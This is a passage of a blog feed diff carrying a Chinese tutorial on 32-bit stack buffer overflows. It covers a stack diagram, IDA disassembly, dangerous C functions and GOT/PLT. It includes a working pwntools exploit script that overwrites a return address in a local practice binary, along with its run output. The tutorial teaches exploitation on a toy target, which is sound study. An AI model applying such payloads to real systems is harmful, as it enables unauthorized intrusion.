+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+
+
+<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>
+
+
+<p>那么如果我们读取的字符串为</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>
+
+
+<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+
+
+<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>
+
+
+<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p>执行一波代码，可以得到</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到我们确实已经执行 success 函数。</p>
+<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
+<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
+<ul>
+<li>输入<ul>
+<li>gets，直接读取一行，忽略’\x00’</li>
+<li>scanf</li>
+<li>vscanf</li>
+</ul>
+</li>
+<li>输出<ul>
+<li>sprintf</li>
+</ul>
+</li>
+<li>字符串<ul>
+<li>strcpy，字符串复制，遇到’\x00’停止</li>
+<li>strcat，字符串拼接，遇到’\x00’停止</li>
+<li>bcopy</li>
+</ul>
+</li>
+</ul>
+<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
+<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
+<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
+<p>运行时程序的栈：<br>上面高地址处存放的是环境变量和main函数的信息<br>往下是主调函数的栈内存，包括临时变量和控制信息（控制信息包括返回地址和ebp等用来保存的寄存器的值）</p>
+<p>调用约定：<br>每个函数调用的时候都会自己平衡自己的堆栈。</p>
+<p>每个被调函数被调用的时候先push　ebp所以栈里面会有返回地址和ebp</p>
+<h2 id="两个表"><a href="#两个表" class="headerlink" title="两个表"></a><strong>两个表</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
+<ul>
+<li>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址</li>
+<li>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</li>
+</ul>
+<p>plt表：函数调用的时候先使用的。<strong>PLT表中的每一项的-数据内容都是对应的GOT表中一项的地址这个是固定不变的</strong>，<strong>PLT表中的数据是跳转到GOT表项的地址</strong>。  </p>
+<p>got表：一个指向真正运行函数首地址的指针。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>函数</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">遇到空格(<span class="number">0x20</span>)停止读取</span><br><span class="line"></span><br><span class="line">read函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">读取数据遇到\n(<span class="number">0x0a</span>)结束，\x0a会读进去</span><br><span class="line">fd为<span class="number">0</span>从键盘读取</span><br><span class="line"></span><br><span class="line">gets函数</span><br><span class="line">gets(str);</span><br><span class="line">输入遇到\n(<span class="number">0x0a</span>)结束</span><br><span class="line">\x0a不会读进去</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>函数</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">输出直到\x00</span><br><span class="line"></span><br><span class="line">write函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fd为<span class="number">1</span>输出到显示器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>函数</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">相当于<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">输出字符串（遇到\x00结束）</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">一直复制直到遇到\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>函数</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">复制任意内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line">如果n&lt;src的长度，只是将src的前n个字符复制到dest的前n个字符，不自动添加<span class="string">&#x27;\0&#x27;</span>。如果src的长度小于n个字节，则以<span class="literal">NULL</span>填充dest直到复制完n个字节</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>指令</category>
+        <category>二进制安全</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
